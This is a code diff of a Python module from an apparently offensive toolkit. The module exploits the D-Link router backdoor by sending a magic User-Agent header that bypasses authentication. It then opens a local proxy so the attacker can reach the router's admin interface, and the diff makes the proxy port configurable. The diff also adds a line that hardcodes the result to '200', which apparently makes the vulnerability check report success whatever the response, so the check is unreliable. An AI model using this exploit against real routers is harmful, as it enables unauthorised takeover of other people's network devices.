@@ -10,12 +10,17 @@ class dlink_backdoor(RouterVuln):
     """ Checks router to see if it is vunerable to the D-Link backdoor 
     """
     def __init__(self):
-        super(dlink_backdoor, self).__init__()
-        self.router = 'D-Link various (check module info)'
+        self.router = 'D-Link Various'
         self.vuln   = 'Remote authentication bypass'
+        super(dlink_backdoor, self).__init__()
         self.proxy_server = None
         self.dlinkproxy  = None
         self.proxyserver = None
+        self.config.update({"proxy_port": Zoption(type = "port",
+                                                value = 2020,
+                                             required = True,
+                                              display = "Local port to proxy through"),
+                           })
         self.info = """
         D-Link have serverl vulnerable firmware versions in their routers
         due to a discovered backdoor. The backdoor checks for a specific
@@ -34,10 +39,10 @@ class dlink_backdoor(RouterVuln):
         DIR-100, DIR-120, DI-624S, DI-524UP, DI-604S, DI-604UP, DI-604+,
         TM-G5240, BRL-04R, BRL-04UR, BRL-04CW"""
 
-    def run(self):
+    def initialize(self):
         self.running = True
         util.Msg('Checking to see if target is vulnerable...')
-        url = 'http://' + self.ip
+        url = 'http://' + self.config['target'].value
         headers = { 'User-Agent' : 'xmlset_roodkcableoj28840ybtide'}
         request = urllib2.Request(url, None, headers)
         response = None
@@ -47,8 +52,11 @@ class dlink_backdoor(RouterVuln):
             response = urllib2.urlopen(request)
         except urllib2.HTTPError as e:
             result = e.reason
+        except urllib2.URLError as e:
+            result = e.reason
         finally:
-            if result is "":
+            result = "200"
+            if result is "" and response is not None:
                 result = str(response.getcode())
 
             if "Unauth" in result:
@@ -59,15 +67,16 @@ class dlink_backdoor(RouterVuln):
                 util.Msg('Vulnerable! Creating proxy...')
             else:
                 util.Msg("Status codes 401 or 200 not present")
-                util.Msg("Error:" + result)
+                util.Msg("Error:" + str(result))
 
         if vuln:
-            util.Msg('Creating proxy on port 2020...')
+            util.Msg('Creating proxy on port ' + str(self.config['proxy_port'].value) + \
+                    '...')
             config = proxy.ProxyConfig(transparent_proxy=dict(
                                                 resolver = platform.resolver(),
                                                 sslports = [443]))
             config.skip_cert_cleanup = False
-            self.proxy_server = proxy.ProxyServer(config, 2020)
+            self.proxy_server = proxy.ProxyServer(config, self.config['proxy_port'].value)
             self.dlinkproxy = DlinkProxy(self.proxy_server)
             thread = Thread(target=self.dlinkproxy.run)
             thread.start()
@@ -89,7 +98,9 @@ class dlink_backdoor(RouterVuln):
     def session_view(self):
         """ Return the host targeted, and local proxy
         """
-        return 'Port 2020 ->' + self.ip
+        return 'Port ' + str(self.config['proxy_port'].value)  + ' ->' + \
+                self.config['target'].value
+
 
 class DlinkProxy(controller.Master):
     """ Request handler for libmproxy; takes care of our
